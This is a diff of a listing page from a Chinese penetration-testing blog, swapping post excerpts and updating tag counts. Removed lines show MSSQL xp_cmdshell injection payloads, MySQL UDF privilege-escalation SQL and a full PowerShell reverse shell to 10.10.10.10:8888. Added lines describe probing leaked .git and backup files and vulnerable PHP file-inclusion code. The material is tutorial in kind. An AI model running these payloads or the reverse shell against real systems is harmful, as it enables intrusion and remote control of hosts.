@@ -66,181 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/">Windows下第三方服务提权</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-07
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
-提权条件：数据库账号是DBA权限
- 关于xp_cmdshell
- 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell 'net user'; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell 'net user';--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
-提权条件：MySQL是system权限
- 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
- UDF提权过程
- 导入udf.dll到服务器指定目录
- MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
- MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
-CREATE FUNCTION shell RETURNS STRING SONAME &lsquo;udf.dll&rsquo;; 执行MySQL语句调用新创建的函数
-select shell(&lsquo;cmd&rsquo;,&lsquo;whoami&rsquo;); 删除创建的函数
-drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   
-    </p>
-
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/">Windows下系统漏洞提权</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-07
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         提权是在已经getshell但是权限不大的前提下做的
-0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
-systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &quot;%i&quot;||@echo %i Not Installed!)&amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 
-    </p>
-
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/reverse-shell/">反弹shell小结</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-06
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E5%8F%8D%E5%BC%B9shell">反弹shell</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
-0x00 PowerShell #更换ip和端口即可 本地：nc -lv 8888 目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.10.10.10';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/reverse-shell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/">Dedecms远程写文件漏洞</a></h2>
 
         
@@ -646,6 +471,183 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/sensitive-information-leakage/">敏感信息泄露</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-28
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify  0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他  0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等  0x03 第三方软件应用 * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件  0x04 敏感信息搜集工具 https://github.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/sensitive-information-leakage/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/">任意文件查看与下载漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-27
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞
+0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容  0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞  0x03 任意文件读取 代码形式可如下几种：
+&lt;?php $filename = &quot;test.txt&quot;; readfile($filename); ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $data = file_get_contents($filename); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt;  0x04 任意文件下载 直接下载：
+&lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt;  用header()下载：
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/any-file-view-and-download-vulnerability/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/file-include-vulnerabilities/">文件包含漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-07-26
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        环境：phpStudy 2016、DVWA v1.10
+0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
+几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
+在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
+0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
+ 0x06 本地包含GetShell  简单代码示例  &lt;?php if (@$_GET['page']) { include(&quot;./action/&quot;.$_GET['page']); } else { include &quot;.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/file-include-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
 
             
 
@@ -657,7 +659,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
             <a href="/page/9/"><i class="fa fa-chevron-left"></i></a>
         
 
-        <span>&nbsp;10 / 19&nbsp;</span>
+        <span>&nbsp;10 / 18&nbsp;</span>
         
         
             <a href="/page/11/"><i class="fa fa-chevron-right"></i></a>
@@ -683,7 +685,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
+                <a href="https://wyb0.com/topics/git" title="git">git(4)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -693,7 +695,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
+                <a href="https://wyb0.com/topics/linux" title="linux">linux(25)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -703,7 +705,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(83)</a>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -713,7 +715,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
+                <a href="https://wyb0.com/topics/python" title="python">python(28)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -723,7 +725,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
+                <a href="https://wyb0.com/topics/windows" title="windows">windows(2)</a>
             </li>
         
     </ul>
@@ -800,7 +802,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/git" title="git">git</a>
-                <sup>6</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -825,7 +827,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
-                <sup>11</sup>
+                <sup>10</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -880,7 +882,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/python" title="python">python</a>
-                <sup>30</sup>
+                <sup>26</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -926,11 +928,6 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
                 <sup>11</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="https://wyb0.com/tags/tornado" title="tornado">tornado</a>
-                <sup>1</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -1020,7 +1017,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
-                <sup>2</sup>
+                <sup>1</sup>
             </p>
         
     </div>
